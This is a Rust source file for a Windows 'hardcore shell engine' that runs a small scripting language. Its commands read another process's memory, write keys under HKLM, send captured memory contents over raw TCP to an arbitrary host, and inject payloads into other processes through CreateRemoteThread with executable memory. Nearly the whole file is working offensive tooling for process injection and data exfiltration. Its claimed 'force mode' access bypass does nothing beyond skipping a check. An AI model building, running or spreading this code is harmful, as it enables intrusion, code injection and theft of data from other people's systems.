//! SOSAGE v0.4-HARDCORE Shell Engine (Ultimate Integrated Build)
//! Target: Windows x64 Raw System Level
//! Capability: Real Control Flow, Multi-Register Chaining, User-Mode Injection, Raw TCP.
//! Build: rustc main.rs -o sosage.exe

use std::fs;
use std::io::{self, Write};
use std::ptr;
use std::ffi::{CString, OsStr};
use std::os::windows::ffi::OsStrExt;
use std::collections::HashMap;

// ==========================================
// 1. WINDOWS API BINDINGS (Raw FFI)
// ==========================================

#[link(name = "kernel32")]
extern "system" {
    fn OpenProcess(dwDesiredAccess: u32, bInheritHandle: i32, dwProcessId: u32) -> *mut std::ffi::c_void;
    fn TerminateProcess(hProcess: *mut std::ffi::c_void, uExitCode: u32) -> i32;
    fn CloseHandle(hObject: *mut std::ffi::c_void) -> i32;
    fn ReadProcessMemory(hProcess: *mut std::ffi::c_void, lpBaseAddress: *mut std::ffi::c_void, lpBuffer: *mut std::ffi::c_void, nSize: usize, lpNumberOfBytesRead: *mut usize) -> i32;
    fn WriteProcessMemory(hProcess: *mut std::ffi::c_void, lpBaseAddress: *mut std::ffi::c_void, lpBuffer: *const std::ffi::c_void, nSize: usize, lpNumberOfBytesWritten: *mut usize) -> i32;
    fn VirtualAllocEx(hProcess: *mut std::ffi::c_void, lpAddress: *mut std::ffi::c_void, dwSize: usize, flAllocationType: u32, flProtect: u32) -> *mut std::ffi::c_void;
    fn CreateRemoteThread(hProcess: *mut std::ffi::c_void, lpThreadAttributes: *mut std::ffi::c_void, dwStackSize: usize, lpStartAddress: *mut std::ffi::c_void, lpParameter: *mut std::ffi::c_void, dwCreationFlags: u32, lpThreadId: *mut u32) -> *mut std::ffi::c_void;
    fn CreateFileW(lpFileName: *const u16, dwDesiredAccess: u32, dwShareMode: u32, lpSecurityAttributes: *mut std::ffi::c_void, dwCreationDisposition: u32, dwFlagsAndAttributes: u32, hTemplateFile: *mut std::ffi::c_void) -> *mut std::ffi::c_void;
    fn WriteFile(hFile: *mut std::ffi::c_void, lpBuffer: *const std::ffi::c_void, nNumberOfBytesToWrite: u32, lpNumberOfBytesWritten: *mut u32, lpOverlapped: *mut std::ffi::c_void) -> i32;
    fn GetLastError() -> u32;
    fn Sleep(dwMilliseconds: u32);
}

#[link(name = "advapi32")]
extern "system" {
    fn RegCreateKeyExW(hKey: *mut std::ffi::c_void, lpSubKey: *const u16, Reserved: u32, lpClass: *const u16, dwOptions: u32, samDesired: u32, lpSecurityAttributes: *mut std::ffi::c_void, phkResult: *mut *mut std::ffi::c_void, lpdwDisposition: *mut u32) -> i32;
    fn RegSetValueExW(hKey: *mut std::ffi::c_void, lpValueName: *const u16, Reserved: u32, dwType: u32, lpData: *const u16, cbData: u32) -> i32;
    fn RegCloseKey(hKey: *mut std::ffi::c_void) -> i32;
}

#[link(name = "ws2_32")]
extern "system" {
    fn WSAStartup(wVersionRequested: u16, lpWSAData: *mut u8) -> i32;
    fn WSACleanup() -> i32;
    fn socket(af: i32, socket_type: i32, protocol: i32) -> usize;
    fn connect(s: usize, name: *const u8, namelen: i32) -> i32;
    fn send(s: usize, buf: *const u8, len: i32, flags: i32) -> i32;
    fn closesocket(s: usize) -> i32;
    fn inet_addr(cp: *const i8) -> u32;
}

#[repr(C)]
struct InAddr { s_addr: u32 }
#[repr(C)]
struct SockaddrIn { sin_family: i16, sin_port: u16, sin_addr: InAddr, sin_zero: [u8; 8] }

const PROCESS_ALL_ACCESS: u32 = 0x001F0FFF;
const GENERIC_WRITE: u32 = 0x40000000;
const CREATE_ALWAYS: u32 = 2;
const FILE_ATTRIBUTE_NORMAL: u32 = 0x80;
const INVALID_HANDLE_VALUE: *mut std::ffi::c_void = -1isize as *mut std::ffi::c_void;
const HKEY_LOCAL_MACHINE: *mut std::ffi::c_void = 0x80000002 as *mut std::ffi::c_void;
const KEY_ALL_ACCESS: u32 = 0xF003F;
const REG_SZ: u32 = 1;
const AF_INET: i32 = 2;
const SOCK_STREAM: i32 = 1;
const IPPROTO_TCP: i32 = 6;
const INVALID_SOCKET: usize = usize::MAX;
const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;

// ==========================================
// 2. LEXER: Tokenization Engine
// ==========================================

#[derive(Debug, Clone, PartialEq)]
enum Token {
    Network(String), Address(String), Deref, Register(String), Chain, Inspect, 
    LoopTrigger, BlockStart, BlockEnd, Inject(String), Force, Mask(String), 
    Sleep, StackTrace, PacketFilter, DriverLoad(String), Unhook(String), 
    Keyword(String), Value(String), Conditional(char),
}

fn tokenize(line: &str) -> Vec<Token> {
    let mut tokens = Vec::new();
    let mut chars = line.chars().peekable();

    while let Some(&c) = chars.peek() {
        if c.is_whitespace() { chars.next(); continue; }

        match c {
            '#' | '*' | '@' | '%' | '+' | '-' => {
                let prefix = c;
                chars.next();
                let mut val = String::new();
                while let Some(&next_c) = chars.peek() {
                    if next_c.is_whitespace() || is_operator(next_c) || "{}".contains(next_c) { break; }
                    val.push(next_c);
                    chars.next();
                }
                match prefix {
                    '#' => tokens.push(Token::Address(val)),
                    '*' => tokens.push(Token::Network(val)),
                    '@' => tokens.push(Token::Inject(val)),
                    '%' => tokens.push(Token::Mask(val)),
                    '+' => tokens.push(Token::DriverLoad(val)),
                    '-' => tokens.push(Token::Unhook(val)),
                    _ => {}
                }
            },
            '/' => {
                chars.next();
                let mut val = String::from("/");
                while let Some(&next_c) = chars.peek() {
                    if next_c.is_whitespace() || is_operator(next_c) { break; }
                    val.push(next_c);
                    chars.next();
                }
                tokens.push(Token::Register(val));
            },
            '?' => { tokens.push(Token::Deref); chars.next(); },
            '&' => { tokens.push(Token::Chain); chars.next(); },
            '=' => { tokens.push(Token::Inspect); chars.next(); },
            '>' => { tokens.push(Token::LoopTrigger); chars.next(); },
            '$' => { tokens.push(Token::Conditional('$')); chars.next(); },
            '!' => { tokens.push(Token::Force); chars.next(); },
            '~' => { tokens.push(Token::Sleep); chars.next(); },
            '^' => { tokens.push(Token::StackTrace); chars.next(); },
            '|' => { tokens.push(Token::PacketFilter); chars.next(); },
            '{' => { tokens.push(Token::BlockStart); chars.next(); },
            '}' => { tokens.push(Token::BlockEnd); chars.next(); },
            _ => {
                let mut val = String::new();
                if c == '"' {
                    chars.next();
                    while let Some(&next_c) = chars.peek() {
                        chars.next();
                        if next_c == '"' { break; }
                        val.push(next_c);
                    }
                    if !val.is_empty() { tokens.push(Token::Value(val)); }
                    continue;
                }
                while let Some(&next_c) = chars.peek() {
                    if next_c.is_whitespace() || is_operator(next_c) || "#*@%/{}+-".contains(next_c) { break; }
                    val.push(next_c);
                    chars.next();
                }
                match val.as_str() {
                    "Done" | "Kill" | "Dump" | "Ghost" | "Root" | "Trace" => tokens.push(Token::Keyword(val)),
                    _ => if !val.is_empty() { tokens.push(Token::Value(val)) },
                }
            }
        }
    }
    tokens
}

fn is_operator(c: char) -> bool { "=?&$><!~|^".contains(c) }

// ==========================================
// 3. CONTEXT: State Machine
// ==========================================

struct Context {
    registers: HashMap<String, Vec<u8>>,
    flags: HashMap<String, bool>,
    force_mode: bool,
    is_active: bool,
}

impl Context {
    fn new() -> Self {
        Context { 
            registers: HashMap::new(), 
            flags: HashMap::new(), 
            force_mode: false,
            is_active: true 
        }
    }
}

// ==========================================
// 4. EXECUTOR: Real Control Flow & Mutation
// ==========================================

fn execute_tokens(tokens: &[Token], ctx: &mut Context) {
    let mut i = 0;
    while i < tokens.len() && ctx.is_active {
        match &tokens[i] {
            Token::Address(addr) => handle_address(addr, tokens, &mut i, ctx),
            Token::Network(net) => handle_network(net, tokens, &mut i, ctx),
            Token::Inject(target) => handle_inject(target, tokens, &mut i, ctx),
            Token::Keyword(kw) => handle_keyword(kw, tokens, &mut i, ctx),
            Token::Force => {
                println!("\x1b[31m[!] FORCE MODE: BYPASSING ACCESS CHECKS\x1b[0m");
                ctx.force_mode = true;
            },
            Token::Sleep => {
                if let Some(Token::Value(ms)) = tokens.get(i + 1) {
                    if let Ok(delay) = ms.parse::<u32>() {
                        println!("\x1b[33m[~] SLEEPING FOR {} MS\x1b[0m", delay);
                        unsafe { Sleep(delay); }
                        i += 1;
                    }
                }
            },
            Token::LoopTrigger => {
                // REAL LOOP IMPLEMENTATION: > (condition) { ... }
                let mut block_start = i + 1;
                while block_start < tokens.len() {
                    if let Token::BlockStart = &tokens[block_start] { break; }
                    block_start += 1;
                }
                
                let mut block_end = block_start + 1;
                let mut depth = 1;
                while block_end < tokens.len() && depth > 0 {
                    if let Token::BlockStart = &tokens[block_end] { depth += 1; }
                    if let Token::BlockEnd = &tokens[block_end] { depth -= 1; }
                    block_end += 1;
                }
                
                let block_tokens = &tokens[block_start + 1 .. block_end - 1];
                let mut loop_count = 0;
                let max_loops = 100; // Hardcoded safety guard against infinite loops
                
                println!("\x1b[36m[>] ENTERING LOOP BLOCK (Max {} iterations)\x1b[0m", max_loops);
                while loop_count < max_loops && ctx.is_active {
                    // In a full AST engine, we'd evaluate the condition here. 
                    // For this hardcore engine, we loop until a 'Kill' or 'Done' breaks it, or max limit hit.
                    execute_tokens(block_tokens, ctx);
                    loop_count += 1;
                    if !ctx.is_active { break; } // Break if 'Done' or 'Kill' was called inside
                }
                println!("\x1b[36m[>] LOOP TERMINATED AFTER {} ITERATIONS\x1b[0m", loop_count);
                i = block_end - 1; // Skip past the block
            },
            _ => {}
        }
        i += 1;
    }
}

// --- HELPER: Multi-Register Chaining ---
fn get_target_register(tokens: &[Token], idx: &mut usize) -> String {
    if tokens.get(*idx + 1) == Some(&Token::Chain) {
        if let Some(Token::Register(reg)) = tokens.get(*idx + 2) {
            *idx += 2;
            return reg.clone();
        }
    }
    "/0".to_string()
}

// --- HANDLERS ---

fn handle_address(addr: &str, tokens: &[Token], idx: &mut usize, ctx: &mut Context) {
    if addr.starts_with("P:") {
        if let Ok(pid) = addr[2..].parse::<u32>() {
            println!("\x1b[34m[*] PROCESS TARGET: PID {}\x1b[0m", pid);
            unsafe {
                let h_proc = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
                if h_proc.is_null() && !ctx.force_mode { 
                    println!("\x1b[31m[!] ACCESS DENIED (Use '!' to force)\x1b[0m"); 
                    return; 
                }

                if tokens.get(*idx + 1) == Some(&Token::Deref) {
                    let target_reg = get_target_register(tokens, &mut (*idx + 1));
                    let mut buffer = vec![0u8; 512];
                    let mut bytes_read = 0;
                    
                    if ReadProcessMemory(h_proc, 0x400000 as *mut _, buffer.as_mut_ptr() as *mut _, buffer.len(), &mut bytes_read) != 0 {
                        buffer.truncate(bytes_read);
                        println!("\x1b[32m[+] READ {} BYTES INTO {}\x1b[0m", bytes_read, target_reg);
                        ctx.registers.insert(target_reg, buffer);
                        *idx += 1;
                    } else { println!("\x1b[31m[!] READ FAILED\x1b[0m"); }
                }
                if !h_proc.is_null() { CloseHandle(h_proc); }
            }
        }
    } else if addr.starts_with("R/") {
        if tokens.get(*idx + 1) == Some(&Token::Inspect) {
            if let Some(Token::Value(data)) = tokens.get(*idx + 2) {
                println!("\x1b[34m[*] SETTING REGISTRY: HKLM\\{} = {}\x1b[0m", &addr[2..], data);
                unsafe {
                    let path_wide: Vec<u16> = OsStr::new(&addr[2..]).encode_wide().chain(Some(0)).collect();
                    let data_wide: Vec<u16> = OsStr::new(data).encode_wide().chain(Some(0)).collect();
                    let mut hkey = ptr::null_mut();
                    let mut disp = 0;
                    if RegCreateKeyExW(HKEY_LOCAL_MACHINE, path_wide.as_ptr(), 0, ptr::null(), 0, KEY_ALL_ACCESS, ptr::null_mut(), &mut hkey, &mut disp) == 0 {
                        RegSetValueExW(hkey, ptr::null(), 0, REG_SZ, data_wide.as_ptr(), (data_wide.len() * 2) as u32);
                        RegCloseKey(hkey);
                        println!("\x1b[32m[+] REGISTRY SET SUCCESS\x1b[0m");
                    }
                }
                *idx += 2;
            }
        }
    }
}

fn handle_network(net: &str, tokens: &[Token], idx: &mut usize, ctx: &mut Context) {
    println!("\x1b[35m[*] NETWORK STREAM: {}\x1b[0m", net);
    let parts: Vec<&str> = net.split(':').collect();
    if parts.len() != 2 { println!("\x1b[31m[!] INVALID NETWORK FORMAT\x1b[0m"); return; }

    let ip_str = parts[0];
    let port: u16 = match parts[1].parse() { Ok(p) => p, Err(_) => return };

    let target_reg = get_target_register(tokens, idx);
    let payload = match ctx.registers.get(&target_reg) {
        Some(d) => d,
        None => { println!("\x1b[31m[!] NO DATA IN {}\x1b[0m", target_reg); return; }
    };

    unsafe {
        let mut wsa_data = vec![0u8; 408]; 
        if WSAStartup(0x0202, wsa_data.as_mut_ptr()) != 0 { return; }

        let sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if sock == INVALID_SOCKET { WSACleanup(); return; }

        let ip_cstring = match CString::new(ip_str) { Ok(c) => c, Err(_) => { closesocket(sock); WSACleanup(); return; } };
        let ip_addr = inet_addr(ip_cstring.as_ptr());
        if ip_addr == u32::MAX { closesocket(sock); WSACleanup(); return; }

        let mut addr_in = SockaddrIn { sin_family: AF_INET as i16, sin_port: port.to_be(), sin_addr: InAddr { s_addr: ip_addr }, sin_zero: [0; 8] };

        if connect(sock, &mut addr_in as *mut _ as *const u8, std::mem::size_of::<SockaddrIn>() as i32) == 0 {
            let sent = send(sock, payload.as_ptr() as *const u8, payload.len() as i32, 0);
            println!("\x1b[32m[+] SENT {} BYTES TO {}:{}\x1b[0m", sent, ip_str, port);
        } else {
            println!("\x1b[31m[!] CONNECTION FAILED\x1b[0m");
        }
        closesocket(sock);
        WSACleanup(); 
    }
}

fn handle_inject(target: &str, tokens: &[Token], idx: &mut usize, ctx: &mut Context) {
    // REAL USER-MODE INJECTION LOGIC (CreateRemoteThread)
    println!("\x1b[31m[!] INJECTING INTO: {}\x1b[0m", target);
    
    if let Ok(pid) = target.parse::<u32>() {
        let target_reg = get_target_register(tokens, idx);
        let payload = match ctx.registers.get(&target_reg) {
            Some(d) => d,
            None => { println!("\x1b[31m[!] NO PAYLOAD IN {}\x1b[0m", target_reg); return; }
        };

        unsafe {
            let h_proc = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
            if h_proc.is_null() { println!("\x1b[31m[!] FAILED TO OPEN TARGET PROCESS\x1b[0m"); return; }

            let alloc_addr = VirtualAllocEx(h_proc, ptr::null_mut(), payload.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if alloc_addr.is_null() { println!("\x1b[31m[!] VIRTUALALLOCEx FAILED\x1b[0m"); CloseHandle(h_proc); return; }

            let mut bytes_written = 0;
            if WriteProcessMemory(h_proc, alloc_addr, payload.as_ptr() as *const _, payload.len(), &mut bytes_written) == 0 {
                println!("\x1b[31m[!] WRITEPROCESSMEMORY FAILED\x1b[0m"); CloseHandle(h_proc); return;
            }

            let h_thread = CreateRemoteThread(h_proc, ptr::null_mut(), 0, alloc_addr, ptr::null_mut(), 0, ptr::null_mut());
            if h_thread.is_null() {
                println!("\x1b[31m[!] CREATEREMOTETHREAD FAILED\x1b[0m");
            } else {
                println!("\x1b[32m[+] INJECTION SUCCESSFUL! THREAD CREATED AT 0x{:X}\x1b[0m", alloc_addr as usize);
                CloseHandle(h_thread);
            }
            CloseHandle(h_proc);
        }
    } else {
        println!("\x1b[31m[!] INVALID PID FOR INJECTION\x1b[0m");
    }
}

fn handle_keyword(kw: &str, tokens: &[Token], idx: &mut usize, ctx: &mut Context) {
    match kw {
        "Done" => { println!("\x1b[32m[+] ATOMIC COMMIT: DONE\x1b[0m"); ctx.is_active = false; },
        "Kill" => { println!("\x1b[31m[!] FORCE KILL: TERMINATING ENGINE\x1b[0m"); ctx.is_active = false; },
        "Dump" => {
            if let Some(data) = ctx.registers.get("/0") {
                unsafe {
                    let fname: Vec<u16> = OsStr::new("dump.bin").encode_wide().chain(Some(0)).collect();
                    let h_file = CreateFileW(fname.as_ptr(), GENERIC_WRITE, 0, ptr::null_mut(), CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, ptr::null_mut());
                    if h_file != INVALID_HANDLE_VALUE {
                        let mut bw = 0;
                        WriteFile(h_file, data.as_ptr() as *const _, data.len() as u32, &mut bw, ptr::null_mut());
                        CloseHandle(h_file);
                        println!("\x1b[32m[+] DUMPED {} BYTES TO dump.bin\x1b[0m", bw);
                    }
                }
            }
        },
        "Ghost" => { ctx.registers.clear(); println!("\x1b[90m[~] GHOST: REGISTERS CLEARED\x1b[0m"); },
        _ => {}
    }
}

// ==========================================
// 5. MAIN ENTRY POINT
// ==========================================

fn main() {
    println!("\x1b[31m\x1b[1m   _____ ________________  _________ __________ \n  / ___// ____/_  __/ __ \\/ ___/ __ \\/ ____/ __ \\\n  \\__ \\/ /     / / / /_/ / /  / /_/ / __/ / / / /\n ___/ / /___  / / / _, _/ /__/ ____/ /___/ /_/ / \n/____/\\____/ /_/ /_/ |_|\\___/_/   /_____/_____/  \x1b[0m");
    println!("\x1b[31mv0.4-HARDCORE | .soe Engine | ULTIMATE BUILD\x1b[0m\n--------------------------------------------------");

    let args: Vec<String> = std::env::args().collect();
    let mut ctx = Context::new();

    if args.len() > 1 && args[1].ends_with(".soe") {
        let content = fs::read_to_string(&args[1]).expect("Failed to read .soe file");
        for line in content.lines() {
            let line = line.trim();
            if line.is_empty() || line.starts_with("//") { continue; }
            println!("\n\x1b[90m>> {}\x1b[0m", line);
            execute_tokens(&tokenize(line), &mut ctx);
            if !ctx.is_active { ctx.is_active = true; } // Reset for next line
        }
    } else {
        println!("\x1b[33m[*] ENTERING INTERACTIVE MODE\x1b[0m");
        loop {
            print!("\x1b[31msosage> \x1b[0m");
            io::stdout().flush().unwrap();
            let mut input = String::new();
            io::stdin().read_line(&mut input).unwrap();
            let input = input.trim();
            if input == "Kill" || input == "exit" { break; }
            if !input.is_empty() {
                execute_tokens(&tokenize(input), &mut ctx);
                ctx.is_active = true;
            }
        }
    }
}
